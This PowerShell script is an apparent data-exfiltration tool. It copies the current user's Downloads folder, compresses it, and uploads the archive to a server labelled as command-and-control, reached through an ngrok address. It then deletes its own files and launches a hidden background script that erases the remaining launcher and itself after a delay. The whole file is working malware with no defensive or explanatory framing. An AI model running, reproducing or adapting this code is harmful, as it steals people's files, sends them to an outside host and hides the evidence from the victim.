# Define paths and server URL
$currentUser = [Environment]::UserName
$sourcePath = "C:\Users\$currentUser\Downloads"
$destinationPath = "C:\Users\$currentUser\$currentUser"
$zipFilePath = "C:\Users\$currentUser\$currentUser.zip"
$c2ServerUrl = "https://charmed-strictly-ringtail.ngrok-free.app/upload"

# Create a new folder in C:\Users\ with the current user's name and copy all files from Downloads
New-Item -ItemType Directory -Force -Path $destinationPath
Get-ChildItem -Path $sourcePath | Copy-Item -Destination $destinationPath -Recurse

# Compress the new folder into a ZIP file
Compress-Archive -Path "$destinationPath\*" -DestinationPath $zipFilePath -Force

# Prepare the multipart/form-data request
$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"
$encoding = [System.Text.Encoding]::UTF8
$multipartContentType = "multipart/form-data; boundary=$boundary"
$contentDisposition = "form-data; name=`"file`"; filename=`"$($zipFilePath | Split-Path -Leaf)`""

# Build the request body with file content directly
$bodyLines = @(
    "--$boundary",
    "Content-Disposition: $contentDisposition",
    "Content-Type: application/octet-stream$LF",
    [System.IO.File]::ReadAllBytes($zipFilePath),
    "--$boundary--"
)

# Convert the body to a byte array
$body = New-Object System.IO.MemoryStream
$writer = New-Object System.IO.BinaryWriter $body
foreach ($line in $bodyLines) {
    if ($line -is [byte[]]) {
        $writer.Write($line, 0, $line.Length)
        $writer.Write($encoding.GetBytes($LF), 0, $encoding.GetByteCount($LF))
    } else {
        $writer.Write($encoding.GetBytes($line + $LF))
    }
}
$writer.Flush()
$bodyBytes = $body.ToArray()
$body.Dispose()
$writer.Dispose()

# Create the WebClient object
$webClient = New-Object System.Net.WebClient

# Add the multipart/form-data content type header
$webClient.Headers.Add("Content-Type", $multipartContentType)

try {
    # Upload the file
    $webClient.UploadData($c2ServerUrl, "POST", $bodyBytes)
    "File uploaded successfully."
}
catch {
    "Failed to upload the file. Error: $_"
}
finally {
    $webClient.Dispose()
}

# Define the paths of the files to be deleted
$filesToDelete = @(
    "$zipFilePath",
    "C:\Users\$currentUser\script.ps1",
    "C:\Users\$currentUser\$currentUser",
    "C:\Users\$currentUser\SilentLauncher.ps1"
)

# Delete specified files
foreach ($file in $filesToDelete) {
    if (Test-Path $file) {
        Remove-Item -Path $file -Force
    }
}

# Path to the dl_ul.ps1 script
$dlUlScriptPath = "C:\Users\$currentUser\dl_ul.ps1"

# Create a temporary script to delete dl_ul.ps1
$tempScriptPath = "C:\Users\$currentUser\tempCleanup.ps1"

# Script content that waits, deletes the dl_ul.ps1, and then deletes itself
$scriptContent = @"
Start-Sleep -Seconds 300
Remove-Item -Path '$dlUlScriptPath' -Force
Remove-Item -Path '$tempScriptPath' -Force
"@

# Write the temporary script content to the file
Set-Content -Path $tempScriptPath -Value $scriptContent

# Execute the temporary script in the background
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$tempScriptPath`"" -NoNewWindow
